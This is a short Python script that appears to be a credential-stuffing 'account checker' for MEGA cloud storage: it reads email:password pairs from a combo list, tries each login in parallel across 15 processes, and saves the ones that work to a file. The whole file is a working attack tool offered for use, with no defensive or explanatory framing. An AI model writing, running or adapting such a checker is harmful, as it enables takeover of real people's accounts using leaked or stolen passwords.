from mega import Mega
import requests # For making web requests
from multiprocessing import Pool # Multi-Threading
from multiprocessing import freeze_support # Windows Support

working = []
accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
mega = Mega()

def checkAccount(accountNumber):
    global working, mega
    try:
        m = mega.login(accounts[accountNumber].split(':')[0], accounts[accountNumber].split(':')[1])
        
        print("[Good Account] " + accounts[accountNumber])
        
        working.append(accounts[accountNumber])
        workingfile = open("working.txt", "a")
        workingfile.write(accounts[accountNumber] + "\n")
        workingfile.close()
    except Exception as e:
        #print("[Bad Account] " + accounts[accountNumber] + " " + str(e))
        print("[Bad Account] " + accounts[accountNumber])


def main():
    numThreads = 15
    freeze_support()
    numAccounts = range(len(accounts))

    pool = Pool(int(numThreads))
    pool.map(checkAccount, numAccounts)

    pool.close()
    pool.join()

if __name__ == "__main__":
    main()
